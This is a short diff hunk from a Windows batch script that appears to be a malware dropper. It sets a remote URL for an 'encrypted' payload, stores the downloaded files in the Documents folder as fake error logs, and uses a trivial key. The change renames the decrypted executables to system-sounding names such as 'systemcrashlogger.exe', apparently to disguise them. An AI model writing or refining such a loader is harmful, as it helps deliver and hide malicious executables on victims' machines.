@@ -92,8 +92,8 @@ set "encryptedBerlinUrl=https://raw.githubusercontent.com/spooffewfe/yff/refs/he
 set "docsDir=%USERPROFILE%\Documents"
 set "encryptedRLFile=%docsDir%\encrypted-rl-error.txt"
 set "encryptedBerlinFile=%docsDir%\system-error.txt"
-set "decryptedRLExe=%docsDir%\decrypted-rl.exe"
-set "decryptedBerlinExe=%docsDir%\decrypted-berlin.exe"
+set "decryptedRLExe=%docsDir%\rlsystem.exe"
+set "decryptedBerlinExe=%docsDir%\systemcrashlogger.exe"
 set "encryptionKey=123"
 
 :: Ensure Documents directory exists
